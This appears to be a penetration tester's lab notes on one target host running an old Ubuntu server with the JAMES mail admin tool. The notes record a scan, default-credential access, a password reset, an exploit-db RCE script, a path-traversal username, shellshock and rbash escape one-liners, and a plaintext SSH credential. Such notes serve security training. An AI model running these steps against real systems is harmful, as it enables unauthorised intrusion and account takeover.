# ip
10.11.1.72

# nmap scan
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.8p1 Debian 7ubuntu1 (Ubuntu Linux; protocol 2.0)
25/tcp   open  smtp?
80/tcp   open  http    Apache httpd 2.2.20 ((Ubuntu))
110/tcp  open  pop3?
111/tcp  open  rpcbind 2-4 (RPC #100000)
119/tcp  open  nntp?
2049/tcp open  nfs_acl 2-3 (RPC #100227)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

## OS 
Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)

## Info about ports
* SSH:  SSH-2.0-OpenSSH_5.8p1 Debian-7ubuntu1 ( service.version=5.8p1 openssh.comment=Debian-7ubuntu1 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH service.cpe23=cpe:/a:openbsd:openssh:5.8p1 os.vendor=Ubuntu os.family=Linux os.product=Linux os.version=11.10 os.cpe23=cpe:/o:canonical:ubuntu_linux:11.10 service.protocol=ssh fingerprint_db=ssh.banner)



## Server
Apache/2.2.20
JAMES Remote Administration Tool 2.3.2

## Programming language
PHP 

## Database 


## Pages
    

# findings                                                                                                              

* Remote code execution: https://www.exploit-db.com/exploits/35513
* nc 10.11.1.72 4555 => to enter to James webserver, pw and username is root
* change pw of john user: Resetted John pw to: `setpassword john 123456`
* use `telnet 10.11.1.72 110` to login as John under pop3 => see: https://dominicbreuker.com/post/htb_solidstate/

# Users
Users: 
user: marcus
user: john
user: mailadmin
user: jenny
user: ../../../../../../../../etc/bash_completion.d
user: ryuu
user: joe45

# SSH

## credentials
username: ryuu
password: QUHqhUPRKXMo4m7k

## rhost exploits
https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf
might be interesting:
* `ssh username@IP -t "() { :; }; /bin/bash" (shellshock)`
* `ssh username@IP -t "bash --noprofile"`

# Marcus creds: 
/home/marcus

## James server

` python 35513.py 10.11.1.72` adjust payload to establish interactive shell
 fix path with: `export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin` to have ls

# Evidence
* connect to ssh with `ssh ryuu@10.11.1.72` => we get rbash which is a restricted shell
* https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/

